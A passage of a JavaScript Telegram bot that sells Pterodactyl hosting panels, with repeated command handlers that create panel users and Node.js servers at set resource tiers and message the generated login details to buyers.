┃ ✧ 𒆜 DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
        await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domain}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
        bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

bot.onText(/\/10gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /10gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "10gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "10000";
  const cpu = "290";
  const disk = "10000";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domain: domain,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
      `
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ 𒆜 NAMA: ${username}
┃ ✧ 𒆜 EMAIL: ${email}
┃ ✧ 𒆜 ID: ${user.id}
┃ ✧ 𒆜 MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ 𒆜 DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
        await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domain}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
        bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
bot.onText(/\/11gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /10gb namapanel,idtele");
    return;
  }
  const username = t[0];
  
  const u = t[1];
  const name = username + "10gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "11000";
  const cpu = "290";
  const disk = "10000";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Limvzc`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domain: domain,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ 𒆜 NAMA: ${username}
┃ ✧ 𒆜 EMAIL: ${email}
┃ ✧ 𒆜 ID: ${user.id}
┃ ✧ 𒆜 MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ 𒆜 DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domain}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

bot.onText(/\/unli (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const randomImage = getRandomImage();

  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }

  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /unli namapanel,idtele");
    return;
  }

  const username = t[0];
  const u = t[1];
  const name = username + "unli";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "0";
  const cpu = "0";
  const disk = "0";
  const email = `${username}@unli.Kruzzy`;
  const akunlo = randomImage;
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;

  let user;
  let server;

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: "en",
        password,
      }),
    });

    const data = await response.json();

    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email & user telah ada di panel King Kruzzy");
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0])}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk,
          io: 500,
          cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domain: domain,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ 𒆜 NAMA: ${username}
┃ ✧ 𒆜 EMAIL: ${email}
┃ ✧ 𒆜 ID: ${user.id}
┃ ✧ 𒆜 MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ 𒆜 DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`);

    try {
      if (akunlo) {
        await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domain}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
        await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

// PANEL V2
bot.onText(/\/1gbv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /1gbv2 namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "1gbv2";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "1024";
  const cpu = "30";
  const disk = "1024";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domainv2}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domainv2: domainv2,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ EMAIL: ${email}
┃ ✧ ID: ${user.id}
┃ ✧ MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domainv2}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
// 2gbv2
bot.onText(/\/2gbv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
    if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /2gbv2 namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "2gbv2";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "2048";
  const cpu = "60";
  const disk = "2048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}_${u}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domainv2}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domainv2: domainv2,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ EMAIL: ${email}
┃ ✧ ID: ${user.id}
┃ ✧ MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domainv2}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

bot.onText(/\/3gbv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /3gbv2 namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "3gbv2";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "3072";
  const cpu = "90";
  const disk = "3072";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di data panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domainv2}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domainv2: domainv2,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ EMAIL: ${email}
┃ ✧ ID: ${user.id}
┃ ✧ MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
     if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domainv2}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 4gbv2
bot.onText(/\/4gbv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /4gbv2 namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "4gbv2";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "4048";
  const cpu = "110";
  const disk = "4048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domainv2}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
